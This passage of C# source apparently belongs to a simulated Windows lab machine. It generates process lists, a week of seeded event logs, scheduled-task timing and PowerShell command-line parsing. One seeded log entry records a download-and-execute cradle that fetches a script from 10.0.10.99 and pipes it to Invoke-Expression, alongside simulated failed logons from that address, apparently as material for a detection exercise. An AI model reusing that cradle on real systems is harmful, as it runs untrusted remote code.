                P("ServerManager", "C:\\Windows\\system32\\ServerManager.exe", 2, me, 0).MainWindowTitle = "Server Manager";
            }
            var explorer = P("explorer", "C:\\Windows\\Explorer.EXE", consoleSession, me, 0); explorer.Description = "Windows Explorer"; explorer.Ws = 98000000; explorer.Handles = 2100; explorer.MainWindowTitle = "";
            P("sihost", "sihost.exe", consoleSession, me, 0);
            P("taskhostw", "taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}", consoleSession, me, 0);
            P("ctfmon", "\"ctfmon.exe\"", consoleSession, me, 0);
            P("RuntimeBroker", "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding", consoleSession, me, 0);
            P("StartMenuExperienceHost", "\"C:\\Windows\\SystemApps\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\StartMenuExperienceHost.exe\" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca", consoleSession, me, 0);
            P("TextInputHost", "\"C:\\Windows\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\TextInputHost.exe\" -ServerName:InputApp.AppX9jnwykgrccxc8by3hsrsh07r423xzvav.mca", consoleSession, me, 0);
            if (!IsServer)
            {
                P("SearchHost", "\"C:\\Windows\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\SearchHost.exe\" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca", 1, me, 0);
                P("Widgets", "\"C:\\Program Files\\WindowsApps\\MicrosoftWindows.Client.WebExperience_424.1301.270.9_x64__cw5n1h2txyewy\\Dashboard\\Widgets.exe\"", 1, me, 0);
                P("OneDrive", "\"C:\\Users\\LabUser\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background", 1, me, 0).Company = "Microsoft Corporation";
                P("SecurityHealthSystray", "\"C:\\Windows\\System32\\SecurityHealthSystray.exe\"", 1, me, 0);
            }
            P("smartscreen", "C:\\Windows\\System32\\smartscreen.exe -Embedding", consoleSession, me, 0);
            P("dllhost", "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}", consoleSession, me, 0);
            P("WmiPrvSE", "C:\\Windows\\system32\\wbem\\wmiprvse.exe", 0, "NT AUTHORITY\\NETWORK SERVICE", 0).Description = "WMI Provider Host";
            P("MpDefenderCoreService", "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.25010.11-0\\MpDefenderCoreService.exe\"", 0, sys, services.Id).Protected = true;
            P("NisSrv", "\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.25010.11-0\\NisSrv.exe\"", 0, "NT AUTHORITY\\LOCAL SERVICE", services.Id);
            if (IsServer) P("vm3dservice", "C:\\Windows\\system32\\vm3dservice.exe", 0, sys, services.Id);
            P("VSSVC", "C:\\Windows\\system32\\vssvc.exe", 0, sys, services.Id);
            foreach (var p in Processes) if (p.Description.Length == 0 && p.Name != "System" && p.Name != "Idle") p.Description = Describe(p.Name);
        }
        static string Describe(string n)
        {
            switch (n)
            {
                case "smss": return "Windows Session Manager"; case "csrss": return "Client Server Runtime Process"; case "wininit": return "Windows Start-Up Application";
                case "winlogon": return "Windows Logon Application"; case "services": return "Services and Controller app"; case "fontdrvhost": return "Usermode Font Driver Host";
                case "LogonUI": return "Windows Logon User Interface Host"; case "sihost": return "Shell Infrastructure Host"; case "taskhostw": return "Host Process for Windows Tasks";
                case "ctfmon": return "CTF Loader"; case "RuntimeBroker": return "Runtime Broker"; case "smartscreen": return "Windows Defender SmartScreen"; case "dllhost": return "COM Surrogate";
                case "ServerManager": return "Server Manager"; case "rdpclip": return "RDP Clipboard Monitor"; case "spoolsv": return "Spooler SubSystem App"; case "MsMpEng": return "Antimalware Service Executable";
                case "notepad": return "Notepad"; case "calc": return "Windows Calculator"; case "mspaint": return "Paint"; case "msdtc": return "Microsoft Distributed Transaction Coordinator Service";
            }
            return n;
        }

        /// <summary>A week of plausible history in the logs (boots, services, logons, application errors, updates).</summary>
        void SeedHistory()
        {
            var r = AdminRng;
            DateTime start = Now.AddDays(-7);
            DateTime prevBoot = Now.AddDays(-4).Date.AddHours(3).AddMinutes(12);
            // the boot before this one
            Action<DateTime> boot = t =>
            {
                BootEvents(t);
                int i = 0;
                foreach (var s in LiveServices.Where(x => x.StartType == "Automatic" && x.ServiceType != "KernelDriver").Take(16)) EventAt(t.AddSeconds(8 + i++ % 5), "System", "Service Control Manager", 7036, 4, "The " + s.DisplayName + " service entered the running state.", null);
            };
            EventAt(start, "System", "EventLog", 6005, 4, "The Event log service was started.", null);
            for (int day = 0; day < 8; day++)
            {
                DateTime d = start.Date.AddDays(day);
                if (d > Now) break;
                Action<DateTime, string, string, int, int, string, string> ev = (t, log, prov, id, lvl, msg, user) => { if (t > start && t < Now && !(t > BootTime.AddSeconds(-45) && t < BootTime.AddMinutes(1)) && !(t > prevBoot && t < prevBoot.AddMinutes(1))) EventAt(t, log, prov, id, lvl, msg, user); };
                ev(d.AddHours(12), "System", "EventLog", 6013, 4, "The system uptime is " + (long)(d.AddHours(12) - (d.AddHours(12) > prevBoot ? prevBoot : prevBoot.AddDays(-23))).TotalSeconds + " seconds.", null);
                for (int k = 0; k < 3; k++)
                {
                    DateTime t = d.AddHours(1 + k * 7 + r.Next(5)).AddMinutes(r.Next(60));
                    ev(t, "System", "Service Control Manager", 7036, 4, "The Windows Update service entered the running state.", null);
                    ev(t.AddMinutes(2), "System", "Service Control Manager", 7036, 4, "The Background Intelligent Transfer Service service entered the running state.", null);
                    ev(t.AddMinutes(4), "System", "Service Control Manager", 7040, 4, "The start type of the Background Intelligent Transfer Service service was changed from auto start to demand start.", "S-1-5-18");
                    ev(t.AddMinutes(9), "System", "Service Control Manager", 7036, 4, "The Windows Update service entered the stopped state.", null);
                    ev(t.AddMinutes(11), "System", "Service Control Manager", 7036, 4, "The Windows Modules Installer service entered the running state.", null);
                    ev(t.AddMinutes(25), "System", "Service Control Manager", 7036, 4, "The Windows Modules Installer service entered the stopped state.", null);
                }
                ev(d.AddHours(2).AddMinutes(r.Next(50)), "System", "DCOM", 10016, 3, "The application-specific permission settings do not grant Local Activation permission for the COM Server application with CLSID \r\n{2593F8B9-4EAF-457C-B68A-50F6B8EA6B54}\r\n and APPID \r\n{15C20B67-12E7-4BB6-92BB-7AFF07997402}\r\n to the user " + DomainShort + "\\Administrator SID (" + AdminUserSid + ") from address LocalHost (Using LRPC) running in the application container Unavailable SID (Unavailable). This security permission can be modified using the Component Services administrative tool.", AdminUserSid);
                ev(d.AddHours(9).AddMinutes(r.Next(50)), "System", "Microsoft-Windows-DNS-Client", 1014, 3, "Name resolution for the name wpad timed out after none of the configured DNS servers responded.", "S-1-5-20");
                ev(d.AddHours(4), "System", "Microsoft-Windows-Time-Service", 37, 4, "The time provider NtpClient is currently receiving valid time data from DC01.lab.example.com (ntp.d|" + Ip + ":123->10.0.10.10:123).", null);
                ev(d.AddHours(13).AddMinutes(r.Next(40)), "System", "Microsoft-Windows-GroupPolicy", 1500, 4, "The Group Policy settings for the computer were processed successfully. There were no changes detected since the last successful processing of Group Policy.", "S-1-5-18");
                ev(d.AddHours(5).AddMinutes(r.Next(59)), "System", "Microsoft-Windows-Kernel-General", 16, 4, "The access history in hive \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat was cleared updating 52 keys and creating 9 modified pages.", "S-1-5-18");
                // application log
                ev(d.AddHours(3).AddMinutes(r.Next(59)), "Application", "VSS", 8224, 4, "The VSS service is shutting down due to idle timeout.", null);
                ev(d.AddHours(6).AddMinutes(r.Next(59)), "Application", "Microsoft-Windows-Security-SPP", 16384, 4, "Successfully scheduled Software Protection service for re-start at " + d.AddDays(1).AddHours(14).ToString("yyyy-MM-ddTHH:mm:ssZ", CultureInfo.InvariantCulture) + ". Reason: RulesEngine.", null);
                ev(d.AddHours(8).AddMinutes(r.Next(59)), "Application", "Microsoft-Windows-RestartManager", 10000, 4, "Starting session 0 - " + d.AddHours(8).ToString("yyyy\\-MM\\-dd", CultureInfo.InvariantCulture) + "T08:00:00.000000000Z.", AdminUserSid);
                ev(d.AddHours(8).AddMinutes(r.Next(59)), "Application", "Microsoft-Windows-RestartManager", 10001, 4, "Ending session 0 started " + d.AddHours(8).ToString("yyyy\\-MM\\-dd", CultureInfo.InvariantCulture) + "T08:00:00.000000000Z.", AdminUserSid);
                ev(d.AddHours(7).AddMinutes(r.Next(59)), "Application", "ESENT", 916, 4, "svchost (" + (2000 + r.Next(5000)) + ",G,0) The beta feature EseDiskFlushConsistency is enabled in ESENT due to the beta site mode settings 0x800000.", null);
                if (day % 3 == 1)
                {
                    DateTime t = d.AddHours(10).AddMinutes(r.Next(59));
                    ev(t, "Application", "Application Error", 1000, 2, "Faulting application name: InventoryAgent.exe, version: 2.4.1.0, time stamp: 0x65a1c3f2\r\nFaulting module name: KERNELBASE.dll, version: 10.0." + OsBuild + ".1, time stamp: 0x7f3a2b10\r\nException code: 0xe0434352\r\nFault offset: 0x000000000005f4bc\r\nFaulting process id: 0x" + (0x1000 + r.Next(0x8000)).ToString("x") + "\r\nFaulting application path: C:\\Program Files\\Inventory\\InventoryAgent.exe\r\nFaulting module path: C:\\Windows\\System32\\KERNELBASE.dll", null);
                    ev(t.AddSeconds(2), "Application", "Windows Error Reporting", 1001, 4, "Fault bucket , type 0\r\nEvent Name: CLR20r3\r\nResponse: Not available\r\nCab Id: 0\r\n\r\nProblem signature:\r\nP1: InventoryAgent.exe\r\nP2: 2.4.1.0", null);
                    ev(t.AddSeconds(1), "Application", ".NET Runtime", 1026, 2, "Application: InventoryAgent.exe\r\nFramework Version: v4.0.30319\r\nDescription: The process was terminated due to an unhandled exception.\r\nException Info: System.Data.SqlClient.SqlException\r\n   at Inventory.Agent.Sync()", null);
                }
                if (day == 2) ev(d.AddHours(11), "Application", "MsiInstaller", 1033, 4, "Windows Installer installed the product. Product Name: Inventory Agent. Product Version: 2.4.1. Product Language: 1033. Manufacturer: Lab Example. Installation success or error status: 0.", AdminUserSid);
                // security log: logons, a few failures
                for (int k = 0; k < 6 + r.Next(5); k++)
                {
                    DateTime t = d.AddHours(r.Next(24)).AddMinutes(r.Next(60));
                    bool net = r.Next(3) > 0;
                    ev(t, "Security", "Microsoft-Windows-Security-Auditing", 4624, 0, LogonMessage(net ? 3 : 2, net ? "svc_backup" : "Administrator", net ? "10.0.10.50" : "127.0.0.1"), null);
                    ev(t.AddSeconds(0), "Security", "Microsoft-Windows-Security-Auditing", 4672, 0, "Special privileges assigned to new logon.\r\n\r\nSubject:\r\n\tSecurity ID:\t\t" + DomainShort + "\\" + (net ? "svc_backup" : "Administrator") + "\r\n\tAccount Name:\t\t" + (net ? "svc_backup" : "Administrator") + "\r\n\tAccount Domain:\t\t" + DomainShort + "\r\n\tLogon ID:\t\t0x" + (0x100000 + r.Next(0xFFFFF)).ToString("X") + "\r\n\r\nPrivileges:\t\tSeSecurityPrivilege\r\n\t\t\tSeBackupPrivilege\r\n\t\t\tSeRestorePrivilege", null);
                    ev(t.AddMinutes(5 + r.Next(50)), "Security", "Microsoft-Windows-Security-Auditing", 4634, 0, "An account was logged off.\r\n\r\nSubject:\r\n\tSecurity ID:\t\t" + DomainShort + "\\" + (net ? "svc_backup" : "Administrator") + "\r\n\tAccount Name:\t\t" + (net ? "svc_backup" : "Administrator") + "\r\n\tAccount Domain:\t\t" + DomainShort + "\r\n\r\nLogon Type:\t\t\t" + (net ? 3 : 2) + "\r\n\r\nThis event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.", null);
                }
                if (day == 5 || day == 6)
                    for (int k = 0; k < 4 + day; k++)
                    {
                        DateTime t = d.AddHours(2).AddMinutes(17 + k);
                        ev(t, "Security", "Microsoft-Windows-Security-Auditing", 4625, 0, FailMessage(k % 2 == 0 ? "admin" : "administrator", "10.0.10.99"), null);
                    }
                ev(d.AddHours(15).AddMinutes(r.Next(59)), "Security", "Microsoft-Windows-Security-Auditing", 4798, 0, "A user's local group membership was enumerated.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\t" + Name + "$\r\n\tAccount Domain:\t\t" + DomainShort + "\r\n\r\nUser:\r\n\tSecurity ID:\t\t" + MachineSid + "-500\r\n\tAccount Name:\t\tAdministrator\r\n\tAccount Domain:\t\t" + Name + "\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1a4c\r\n\tProcess Name:\t\tC:\\Windows\\System32\\svchost.exe", null);
                // PowerShell logs
                DateTime ps = d.AddHours(10).AddMinutes(r.Next(300));
                ev(ps, "Windows PowerShell", "PowerShell", 600, 4, ProviderStarted("Registry"), null);
                ev(ps, "Windows PowerShell", "PowerShell", 400, 4, EngineState("Available", "None"), null);
                ev(ps.AddMinutes(30 + r.Next(60)), "Windows PowerShell", "PowerShell", 403, 4, EngineState("Stopped", "Available"), null);
                ev(ps, "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 40961, 4, "PowerShell console is starting up", AdminUserSid);
                ev(ps.AddSeconds(1), "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 40962, 4, "PowerShell console is ready for user input", AdminUserSid);
                ev(ps.AddSeconds(1), "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 53504, 4, "Windows PowerShell has started an IPC listening thread on process: " + (3000 + r.Next(6000)) + " in AppDomain: DefaultAppDomain.", AdminUserSid);
                if (day == 4) ev(ps.AddMinutes(3), "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 4104, 3, "Creating Scriptblock text (1 of 1):\r\nInvoke-WebRequest -Uri http://10.0.10.99/a.ps1 -UseBasicParsing | Invoke-Expression\r\n\r\nScriptBlock ID: 6b1e1d2a-4c8f-4f53-9d2a-0a5f1c2e7b31\r\nPath: ", AdminUserSid);
                if (d.Date == prevBoot.Date)
                {
                    ev(prevBoot.AddMinutes(-2), "System", "Microsoft-Windows-WindowsUpdateClient", 19, 4, "Installation Successful: Windows successfully installed the following update: 2026-02 Cumulative Update for " + (IsServer ? "Microsoft server operating system version 21H2" : "Windows 11 Version 23H2") + " for x64-based Systems (" + Hotfixes.Last().Id + ")", "S-1-5-18");
                    ev(prevBoot, "System", "User32", 1074, 4, "The process C:\\Windows\\uus\\AMD64\\MoUsoCoreWorker.exe (" + Name + ") has initiated the restart of computer " + Name + " on behalf of user NT AUTHORITY\\SYSTEM for the following reason: Operating System: Service pack (Planned)\r\n Reason Code: 0x80020010\r\n Shutdown Type: restart\r\n Comment: ", "S-1-5-18");
                    ev(prevBoot.AddSeconds(5), "System", "EventLog", 6006, 4, "The Event log service was stopped.", null);
                    ev(prevBoot.AddSeconds(6), "System", "Microsoft-Windows-Kernel-General", 13, 4, "The operating system is shutting down at system time " + SysTime(prevBoot.AddSeconds(6).ToUniversalTimeLab(UtcOffsetHours)) + ".", null);
                    boot(prevBoot.AddSeconds(50));
                }
            }
            // this boot
            EventAt(BootTime.AddSeconds(-40), "System", "User32", 1074, 4, "The process C:\\Windows\\system32\\shutdown.exe (" + Name + ") has initiated the restart of computer " + Name + " on behalf of user " + DomainShort + "\\Administrator for the following reason: Other (Planned)\r\n Reason Code: 0x80000000\r\n Shutdown Type: restart\r\n Comment: Lab maintenance", AdminUserSid);
            EventAt(BootTime.AddSeconds(-35), "System", "EventLog", 6006, 4, "The Event log service was stopped.", null);
            boot(BootTime);
            EventAt(BootTime.AddMinutes(2), "Security", "Microsoft-Windows-Security-Auditing", 4624, 0, LogonMessage(10, "Administrator", "10.0.10.5"), null);
        }

        public string LogonMessage(int type, string user, string ip)
        {
            return "An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\t" + Name + "$\r\n\tAccount Domain:\t\t" + DomainShort + "\r\n\tLogon ID:\t\t0x3E7\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t" + type + "\r\n\tRestricted Admin Mode:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\t" + DomainShort + "\\" + user + "\r\n\tAccount Name:\t\t" + user + "\r\n\tAccount Domain:\t\t" + DomainShort + "\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t" + Name + "\r\n\tSource Network Address:\t" + ip + "\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\t" + (type == 3 ? "Kerberos" : "User32") + "\r\n\tAuthentication Package:\t" + (type == 3 ? "Kerberos" : "Negotiate");
        }
        string FailMessage(string user, string ip)
        {
            return "An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tNULL SID\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tNULL SID\r\n\tAccount Name:\t\t" + user + "\r\n\tAccount Domain:\t\t\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC000006A\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t" + ip + "\r\n\tSource Port:\t\t0";
        }
        static string ProviderStarted(string p) { return "Provider \"" + p + "\" is Started. \r\n\r\nDetails: \r\n\tProviderName=" + p + "\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1"; }
        static string EngineState(string n, string prev) { return "Engine state is changed from " + prev + " to " + n + ". \r\n\r\nDetails: \r\n\tNewEngineState=" + n + "\r\n\tPreviousEngineState=" + prev + "\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1"; }

        /// <summary>A security event for an account change (4720 created, 4722 enabled, 4725 disabled, 4726 deleted, 4738 changed, 4724 password reset, 4781 renamed, 4732/4733 group member added / removed, 4731/4734/4735 group).</summary>
        public void AccountEvent(int id, string target, string targetSid, string extra)
        {
            string head;
            switch (id)
            {
                case 4720: head = "A user account was created."; break;
                case 4722: head = "A user account was enabled."; break;
                case 4725: head = "A user account was disabled."; break;
                case 4726: head = "A user account was deleted."; break;
                case 4738: head = "A user account was changed."; break;
                case 4724: head = "An attempt was made to reset an account's password."; break;
                case 4781: head = "The name of an account was changed:"; break;
                case 4731: head = "A security-enabled local group was created."; break;
                case 4734: head = "A security-enabled local group was deleted."; break;
                case 4735: head = "A security-enabled local group was changed."; break;
                case 4732: head = "A member was added to a security-enabled local group."; break;
                case 4733: head = "A member was removed from a security-enabled local group."; break;
                default: head = "An account was changed."; break;
            }
            bool grp = id == 4731 || id == 4734 || id == 4735 || id == 4732 || id == 4733;
            string msg = head + "\r\n\r\nSubject:\r\n\tSecurity ID:\t\t" + AdminUserSid + "\r\n\tAccount Name:\t\tAdministrator\r\n\tAccount Domain:\t\t" + DomainShort + "\r\n\tLogon ID:\t\t0x3E7\r\n\r\n" + (grp ? "Group:" : (id == 4720 ? "New Account:" : "Target Account:")) + "\r\n\tSecurity ID:\t\t" + targetSid + "\r\n\t" + (grp ? "Group Name:" : "Account Name:") + "\t\t" + target + "\r\n\t" + (grp ? "Group Domain:" : "Account Domain:") + "\t\t" + Name + (extra == null ? "" : "\r\n\r\n" + extra);
            Event("Security", "Microsoft-Windows-Security-Auditing", id, 0, msg, null);
        }

        // ------------------------------------------------------------ scheduled tasks on the clock
        /// <summary>When the task runs next after the given time (null: never, or only at startup / logon).</summary>
        public DateTime? NextTaskTime(WinTask t, DateTime after)
        {
            if (t.State == "Disabled") return null;
            DateTime? best = null;
            foreach (var tr in t.Triggers)
            {
                if (!tr.Enabled) continue;
                var n = NextTrigger(tr, after);
                if (n.HasValue && (!best.HasValue || n.Value < best.Value)) best = n;
            }
            return best;
        }
        static DateTime? NextTrigger(WinTrigger tr, DateTime after)
        {
            if (tr.Kind == "AtStartup" || tr.Kind == "AtLogOn") return RepNext(tr, null, after);
            DateTime? cand = null;
            switch (tr.Kind)
            {
                case "Once": cand = tr.Start > after ? tr.Start : (DateTime?)null; if (cand == null) return RepNext(tr, tr.Start, after); break;
                case "Daily":
                {
                    int iv = Math.Max(1, tr.DaysInterval);
                    if (tr.Start > after) return tr.Start;
                    double days = Math.Floor((after - tr.Start).TotalDays / iv) * iv;
                    var last = tr.Start.AddDays(days);
                    var rep = RepNext(tr, last, after);
                    var next = last.AddDays(iv);
                    while (next <= after) next = next.AddDays(iv);
                    return rep.HasValue && rep.Value < next ? rep : next;
                }
                case "Weekly":
                {
                    var days = tr.Days.Count == 0 ? new List<DayOfWeek> { tr.Start.DayOfWeek } : tr.Days;
                    int wi = Math.Max(1, tr.WeeksInterval);
                    DateTime weekStart = tr.Start.Date.AddDays(-(int)tr.Start.DayOfWeek);
                    for (int i = -1; i < 7 * wi * 2 + 8; i++)
                    {
                        var d = after.Date.AddDays(i).Add(tr.Start.TimeOfDay);
                        if (d < tr.Start) continue;
                        int week = (int)Math.Floor((d.Date - weekStart).TotalDays / 7);
                        if (week % wi != 0 || !days.Contains(d.DayOfWeek)) continue;
                        var rep = RepNext(tr, d, after);
                        if (rep.HasValue) return rep;
                        if (d > after) return d;
                    }
                    return null;
                }
            }
            return cand;
        }
        /// <summary>The next repetition (every RepInterval for RepDuration) of a trigger that fired at 'fired'.</summary>
        static DateTime? RepNext(WinTrigger tr, DateTime? fired, DateTime after)
        {
            if (!tr.RepInterval.HasValue || tr.RepInterval.Value.TotalMinutes < 1 || !fired.HasValue) return null;
            var iv = tr.RepInterval.Value;
            var end = tr.RepDuration.HasValue && tr.RepDuration.Value > TimeSpan.Zero ? fired.Value + tr.RepDuration.Value : DateTime.MaxValue.AddDays(-1);
            if (after < fired.Value) return null;
            long n = (long)Math.Floor((after - fired.Value).TotalSeconds / iv.TotalSeconds) + 1;
            var t = fired.Value.AddSeconds(n * iv.TotalSeconds);
            return t < end ? t : (DateTime?)null;
        }

        partial void OnNextTimer(DateTime now, ref DateTime? next)
        {
            foreach (var t in Tasks)
            {
                if (t.State == "Disabled" || !t.NextRun.HasValue) continue;
                if (t.NextRun.Value > now && (!next.HasValue || t.NextRun.Value < next.Value)) next = t.NextRun;
            }
        }
        partial void OnTimers(DateTime now)
        {
            foreach (var t in Tasks.ToList())
            {
                if (t.State == "Disabled" || !t.NextRun.HasValue || t.NextRun.Value > now) continue;
                if (State != "running") continue;
                RunTask(t, "time");
                t.NextRun = NextTaskTime(t, now);
            }
        }

        /// <summary>Runs a task's actions now (on the clock, at startup, Start-ScheduledTask, schtasks /run).</summary>
        public void RunTask(WinTask t, string why)
        {
            if (t.Builtin) { t.LastRun = Now; t.LastResult = 0; t.Runs++; return; }
            var acting = Acting; Acting = null;   // a task runs as its own account, not as the person whose shell moved the clock
            try { RunTaskNow(t); } finally { Acting = acting; }
        }
        void RunTaskNow(WinTask t)
        {
            t.State = "Running";
            t.LastRun = Now;
            t.Runs++;
            int result = 0;
            try { foreach (var a in t.Actions) { result = RunTaskAction(t, a); if (result != 0) break; } }
            finally { if (t.State == "Running") t.State = "Ready"; }
            t.LastResult = result;
            AdminChanged("task:" + t.FullName);
        }
        public string TaskOutput = "";       // what the last task wrote to the console host (for tests)

        int RunTaskAction(WinTask t, WinTaskAction a)
        {
            string exe = ExpandSys(a.Execute ?? "").Trim().Trim('"');
            string file = exe.Contains("\\") ? exe : null;
            string bare = exe.Substring(exe.LastIndexOf('\\') + 1);
            if (bare.EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) bare = bare.Substring(0, bare.Length - 4);
            string args = ExpandSys(a.Arguments ?? "");
            string user = (t.UserId ?? "SYSTEM");
            int bs = user.LastIndexOf('\\'); if (bs >= 0) user = user.Substring(bs + 1);
            if (user.Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase) || user.Equals("S-1-5-18")) user = "SYSTEM";
            if (bare.Equals("powershell", StringComparison.OrdinalIgnoreCase) || bare.Equals("pwsh", StringComparison.OrdinalIgnoreCase))
            {
                if (bare.Equals("pwsh", StringComparison.OrdinalIgnoreCase)) return unchecked((int)0x80070002);
                return RunPowerShellCommandLine(args, user, a.WorkingDirectory, true);
            }
            if (bare.Equals("cmd", StringComparison.OrdinalIgnoreCase)) return 0;
            if (file != null && FindFile(file) == null) return unchecked((int)0x80070002);
            if (bare.Equals("notepad", StringComparison.OrdinalIgnoreCase) || bare.Equals("calc", StringComparison.OrdinalIgnoreCase) || bare.Equals("mspaint", StringComparison.OrdinalIgnoreCase))
            {
                var p = NewProcess(bare, file ?? "C:\\Windows\\system32\\" + bare + ".exe", 0, user == "SYSTEM" ? "NT AUTHORITY\\SYSTEM" : DomainShort + "\\" + user, ParentOf("svchost"));
                p.Description = Describe(bare); p.Ws = 15000000; p.Pm = 3000000; p.Handles = 230;
                return 0;
            }
            return 0;
        }
        public string ExpandSys(string s)
        {
            return System.Text.RegularExpressions.Regex.Replace(s ?? "", "%([^%]+)%", m =>
            {
                string k = m.Groups[1].Value; string v;
                if (k.Equals("SystemRoot", StringComparison.OrdinalIgnoreCase) || k.Equals("windir", StringComparison.OrdinalIgnoreCase)) return "C:\\Windows";
                if (k.Equals("SystemDrive", StringComparison.OrdinalIgnoreCase)) return "C:";
                return EnvMachine.TryGetValue(k, out v) ? v : m.Value;
            });
        }

        /// <summary>Runs "powershell.exe ARGS" (a scheduled task, Start-Process, a service): -File, -Command, -EncodedCommand, -ExecutionPolicy. Returns the exit code.</summary>
        public int RunPowerShellCommandLine(string args, string user, string workDir, bool hidden) { return RunPowerShellCommandLine(args, user, workDir, hidden, null); }
        public int RunPowerShellCommandLine(string args, string user, string workDir, bool hidden, IPsHost show)
        {
            var words = SplitArgs(args);
            string file = null, command = null, policy = null; var rest = new List<string>();
            for (int i = 0; i < words.Count; i++)
            {
                string w = words[i]; string lw = w.ToLowerInvariant();
                if (file != null || command != null) { rest.Add(w); continue; }
                if (lw == "-file" || lw == "-f") { if (i + 1 < words.Count) file = words[++i]; continue; }
                if (lw == "-command" || lw == "-c") { command = string.Join(" ", words.Skip(i + 1).ToArray()); break; }
                if (lw == "-encodedcommand" || lw == "-enc" || lw == "-e" || lw == "-ec") { if (i + 1 < words.Count) { try { command = Encoding.Unicode.GetString(Convert.FromBase64String(words[++i])); } catch (FormatException) { return 1; } } continue; }
                if (lw == "-executionpolicy" || lw == "-ep" || lw == "-exec") { if (i + 1 < words.Count) policy = words[++i]; continue; }
                if (lw == "-windowstyle" || lw == "-w" || lw == "-outputformat" || lw == "-inputformat" || lw == "-version") { i++; continue; }
                if (lw.StartsWith("-", StringComparison.Ordinal)) continue;
                command = string.Join(" ", words.Skip(i).ToArray()); break;
            }
            var host = new NullHost();
            var r = new PsRunspace(this, show ?? host, user);
            try
            {
                if (policy != null) r.ProcessPolicy = policy;
                if (!string.IsNullOrEmpty(workDir)) r.Location = ExpandSys(workDir);
                if (file != null)
                {
                    string full = file.Contains(":") ? file : (r.Location.TrimEnd('\\') + "\\" + file);
                    var node = FindFile(full);
                    if (node == null || node.IsDir) { host.Write("The argument '" + file + "' to the -File parameter does not exist. Provide the path to an existing '.ps1' file as an argument to the -File parameter.\n"); TaskOutput = host.Text.ToString(); return unchecked((int)0xFFFD0000); }
                    string why = r.ScriptBlockedReason(full);
                    if (why != null) { host.Write(why + "\n"); TaskOutput = host.Text.ToString(); return 1; }
                    var sb = new StringBuilder("& '" + full.Replace("'", "''") + "'");
                    foreach (var x in rest) sb.Append(" '").Append(x.Replace("'", "''")).Append("'");
                    r.RunScript(sb.ToString(), "", null);
                }
                else if (command != null) r.RunScript(command, "", null);
                TaskOutput = host.Text.ToString();
                if (r.ExitRequested) return r.LastExit;
                return r.Terminated ? 1 : 0;
            }
            finally { Sessions.Remove(r); r.Closed = true; }
        }
        public static List<string> SplitArgs(string s)
        {
            var l = new List<string>(); var sb = new StringBuilder(); bool q = false, any = false;
            foreach (char ch in s ?? "")
            {
                if (ch == '"') { q = !q; any = true; continue; }
                if (char.IsWhiteSpace(ch) && !q) { if (sb.Length > 0 || any) { l.Add(sb.ToString()); sb.Clear(); any = false; } continue; }
                sb.Append(ch);
            }
            if (sb.Length > 0 || any) l.Add(sb.ToString());
            return l;
        }
    }

    static class LabTime
    {
        public static DateTime ToUniversalTimeLab(this DateTime t, double offsetHours) { return t.AddHours(-offsetHours); }
    }

    public partial class PsRunspace
    {
        public readonly List<PsObj> CimSessions = new List<PsObj>();
        public int CimSessionCount;
        partial void InitAdmin()
        {
            // a new PowerShell process writes to the PowerShell logs, as Windows PowerShell does
            if (M.EventLogs.Count == 0) return;
            M.Event("Windows PowerShell", "PowerShell", 600, 4, "Provider \"FileSystem\" is Started. \r\n\r\nDetails: \r\n\tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1", null);
            M.Event("Windows PowerShell", "PowerShell", 400, 4, "Engine state is changed from None to Available. \r\n\r\nDetails: \r\n\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1", null);
            M.Event("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 40961, 4, "PowerShell console is starting up", M.AdminUserSid);
